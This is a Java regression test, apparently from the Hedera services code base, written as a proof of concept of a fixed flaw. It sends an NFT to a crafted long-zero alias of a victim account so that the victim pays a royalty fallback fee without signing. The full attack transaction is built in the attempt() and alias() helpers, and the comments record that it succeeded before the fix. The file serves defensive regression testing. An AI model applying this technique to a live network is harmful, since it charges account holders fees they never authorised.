// SPDX-License-Identifier: Apache-2.0
package com.hedera.services.bdd.suites.token;

import static com.google.protobuf.ByteString.copyFromUtf8;
import static com.hedera.services.bdd.spec.HapiSpec.hapiTest;
import static com.hedera.services.bdd.spec.queries.QueryVerbs.getAccountBalance;
import static com.hedera.services.bdd.spec.queries.QueryVerbs.getTokenNftInfo;
import static com.hedera.services.bdd.spec.queries.QueryVerbs.getTxnRecord;
import static com.hedera.services.bdd.spec.transactions.TxnVerbs.cryptoCreate;
import static com.hedera.services.bdd.spec.transactions.TxnVerbs.cryptoTransfer;
import static com.hedera.services.bdd.spec.transactions.TxnVerbs.mintToken;
import static com.hedera.services.bdd.spec.transactions.TxnVerbs.tokenAssociate;
import static com.hedera.services.bdd.spec.transactions.TxnVerbs.tokenCreate;
import static com.hedera.services.bdd.spec.transactions.token.CustomFeeSpecs.fixedHbarFeeInheritingRoyaltyCollector;
import static com.hedera.services.bdd.spec.transactions.token.CustomFeeSpecs.royaltyFeeWithFallback;
import static com.hedera.services.bdd.spec.transactions.token.TokenMovement.movingUnique;
import static com.hedera.services.bdd.spec.utilops.UtilVerbs.newKeyNamed;
import static com.hedera.services.bdd.spec.utilops.UtilVerbs.withOpContext;
import static com.hedera.services.bdd.suites.HapiSuite.ONE_HBAR;
import static com.hederahashgraph.api.proto.java.ResponseCodeEnum.INVALID_ACCOUNT_ID;
import static com.hederahashgraph.api.proto.java.ResponseCodeEnum.INVALID_ALIAS_KEY;
import static com.hederahashgraph.api.proto.java.ResponseCodeEnum.INVALID_SIGNATURE;
import static com.hederahashgraph.api.proto.java.ResponseCodeEnum.OK;
import static com.hederahashgraph.api.proto.java.TokenType.NON_FUNGIBLE_UNIQUE;
import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertTrue;

import com.google.protobuf.ByteString;
import com.hedera.services.bdd.junit.HapiTest;
import com.hedera.services.bdd.spec.HapiSpec;
import com.hedera.services.bdd.spec.HapiSpecSetup;
import com.hedera.services.bdd.spec.transactions.crypto.HapiCryptoTransfer;
import com.hederahashgraph.api.proto.java.AccountAmount;
import com.hederahashgraph.api.proto.java.AccountID;
import com.hederahashgraph.api.proto.java.NftTransfer;
import com.hederahashgraph.api.proto.java.SignedTransaction;
import com.hederahashgraph.api.proto.java.TokenTransferList;
import com.hederahashgraph.api.proto.java.Transaction;
import com.hederahashgraph.api.proto.java.TransactionBody;
import com.hederahashgraph.api.proto.java.TransferList;
import java.nio.ByteBuffer;
import java.util.List;
import java.util.concurrent.atomic.AtomicLong;
import java.util.stream.Stream;
import org.junit.jupiter.api.DynamicTest;

/** Private-node reproduction only. No public-network endpoint is configured. */
public class AliasRoyaltyHapiPoC {
    private static final String OWNER = "aliasRoyaltyAttacker";
    private static final String TREASURY = "aliasRoyaltyTreasury";
    private static final String COLLECTOR = "aliasRoyaltyCollector";
    private static final String VICTIM = "aliasRoyaltyVictim";
    private static final String VICTIM_TWO = "aliasRoyaltyVictimTwo";
    private static final String TOKEN = "aliasRoyaltyToken";
    private static final String SUPPLY = "aliasRoyaltySupply";
    private static final long FALLBACK = 100 * ONE_HBAR;
    private final AtomicLong attackFees = new AtomicLong();

    @HapiTest
    Stream<DynamicTest> mixedDomainAliasDebitsUnsignedReceiver() {
        return hapiTest(
                newKeyNamed(SUPPLY),
                cryptoCreate(OWNER).balance(500 * ONE_HBAR),
                cryptoCreate(TREASURY).balance(ONE_HBAR),
                cryptoCreate(COLLECTOR).balance(0L),
                cryptoCreate(VICTIM)
                        .balance(200 * ONE_HBAR)
                        .receiverSigRequired(true)
                        .maxAutomaticTokenAssociations(1),
                cryptoCreate(VICTIM_TWO)
                        .balance(200 * ONE_HBAR)
                        .receiverSigRequired(false)
                        .maxAutomaticTokenAssociations(1),
                tokenCreate(TOKEN)
                        .tokenType(NON_FUNGIBLE_UNIQUE)
                        .initialSupply(0)
                        .supplyKey(SUPPLY)
                        .treasury(TREASURY)
                        .payingWith(OWNER)
                        .withCustom(royaltyFeeWithFallback(
                                1, 10, fixedHbarFeeInheritingRoyaltyCollector(FALLBACK), COLLECTOR)),
                tokenAssociate(OWNER, TOKEN).payingWith(OWNER),
                mintToken(TOKEN, List.of(copyFromUtf8("zero-seed"), copyFromUtf8("one-seed")))
                        .payingWith(OWNER),
                cryptoTransfer(movingUnique(TOKEN, 1L, 2L).between(TREASURY, OWNER))
                        .payingWith(OWNER)
                        .signedBy(OWNER, TREASURY),
                // Correct local receiver requires its key. I provide only my attacker signature.
                attempt(VICTIM, 1L, 0L, true, 0L)
                        .via("aliasRoyaltyLocalControl")
                        .hasPrecheckFrom(OK, INVALID_SIGNATURE)
                        .hasKnownStatus(INVALID_SIGNATURE),
                getAccountBalance(VICTIM).hasTinyBars(200 * ONE_HBAR),
                getAccountBalance(COLLECTOR).hasTinyBars(0L),
                attempt(VICTIM_TWO, 2L, 0L, true, 0L)
                        .via("aliasRoyaltyFallbackControl")
                        // [MT] Was INVALID_TREASURY_ACCOUNT_FOR_TOKEN (for mono-service compatibility?)
                        .hasKnownStatus(INVALID_SIGNATURE),
                // Without the local-shard cache seed, the foreign-shard long-zero alias cannot be created.
                attempt(VICTIM, 1L, 1L, false, 0L)
                        .via("aliasRoyaltyNoSeedControl")
                        .hasKnownStatusFrom(INVALID_ALIAS_KEY, INVALID_ACCOUNT_ID),
                getAccountBalance(VICTIM).hasTinyBars(200 * ONE_HBAR),
                getAccountBalance(COLLECTOR).hasTinyBars(0L),
                // Zero HBAR amount seeds alias bytes -> victim, without requiring the receiver's key.
                attempt(VICTIM, 1L, 1L, true, 0L)
                        .via("aliasRoyaltyZeroAttack")
                        // [MT] Was SUCCESS before the fix
                        .hasKnownStatus(INVALID_ALIAS_KEY)
                        .withProtoStructure(HapiSpecSetup.TxnProtoStructure.NEW),
                withOpContext((spec, log) -> {
                    final var txn = Transaction.parseFrom(spec.registry().getBytes("aliasRoyaltyZeroAttack"));
                    final var signed = SignedTransaction.parseFrom(txn.getSignedTransactionBytes());
                    final var sigs = signed.getSigMap();
                    assertEquals(1, sigs.getSigPairCount());
                    final var prefix = sigs.getSigPair(0).getPubKeyPrefix();
                    assertTrue(spec.registry().getKey(OWNER).getEd25519().startsWith(prefix));
                    assertTrue(!spec.registry().getKey(VICTIM).getEd25519().startsWith(prefix));
                    System.out.println("ZERO_ATTACK_SIGMAP=" + sigs);
                    System.out.println("ZERO_ATTACK_BODY=" + TransactionBody.parseFrom(signed.getBodyBytes()));
                }),
                getTxnRecord("aliasRoyaltyZeroAttack").exposingTo(record -> {
                    attackFees.addAndGet(record.getTransactionFee());
                    System.out.println(
                            "ZERO_ATTACK_STATUS=" + record.getReceipt().getStatus());
                    System.out.println("ZERO_ATTACK_FEE_TINYBAR=" + record.getTransactionFee());
                    System.out.println("ZERO_ATTACK_ASSESSED=" + record.getAssessedCustomFeesList());
                    System.out.println("ZERO_ATTACK_DELTAS=" + record.getTransferList());
                    // [MT] Was 1 assessed fee (the fallback) before the fix
                    assertEquals(0, record.getAssessedCustomFeesCount());
                }),
                // [MT] Was 200 * ONE_HBAR - FALLBACK before the fix
                getAccountBalance(VICTIM).hasTinyBars(200 * ONE_HBAR),
                // [MT] Was FALLBACK before the fix
                getAccountBalance(COLLECTOR).hasTinyBars(0L),
                // [MT] Was VICTIM before the fix
                getTokenNftInfo(TOKEN, 1L).hasAccountID(OWNER));
    }

    private HapiCryptoTransfer attempt(
            String victim, long serial, long receiverShardOffset, boolean seed, long credit) {
        return cryptoTransfer((spec, body) -> {
                    final var owner = spec.registry().getAccountID(OWNER);
                    final var local = alias(spec, victim, 0L);
                    if (seed) {
                        final var transfers = TransferList.newBuilder()
                                .addAccountAmounts(AccountAmount.newBuilder()
                                        .setAccountID(local)
                                        .setAmount(credit));
                        if (credit != 0) {
                            transfers.addAccountAmounts(AccountAmount.newBuilder()
                                    .setAccountID(owner)
                                    .setAmount(-credit));
                        }
                        body.setTransfers(transfers);
                    }
                    body.addTokenTransfers(TokenTransferList.newBuilder()
                            .setToken(spec.registry().getTokenID(TOKEN))
                            .addNftTransfers(NftTransfer.newBuilder()
                                    .setSenderAccountID(owner)
                                    .setReceiverAccountID(alias(spec, victim, receiverShardOffset))
                                    .setSerialNumber(serial)));
                })
                .payingWith(OWNER)
                .signedBy(OWNER)
                .fee(ONE_HBAR);
    }

    private static AccountID alias(HapiSpec spec, String victim, long shardOffset) {
        final var victimId = spec.registry().getAccountID(victim);
        // Long-zero bytes always have a zero prefix; the outer AccountID supplies the shard and realm.
        final byte[] address = ByteBuffer.allocate(20)
                .putInt(0)
                .putLong(0L)
                .putLong(victimId.getAccountNum())
                .array();
        // Offset zero is local on both embedded (0.0) and subprocess (11.12) networks.
        return victimId.toBuilder()
                .setShardNum(victimId.getShardNum() + shardOffset)
                .setAlias(ByteString.copyFrom(address))
                .build();
    }
}
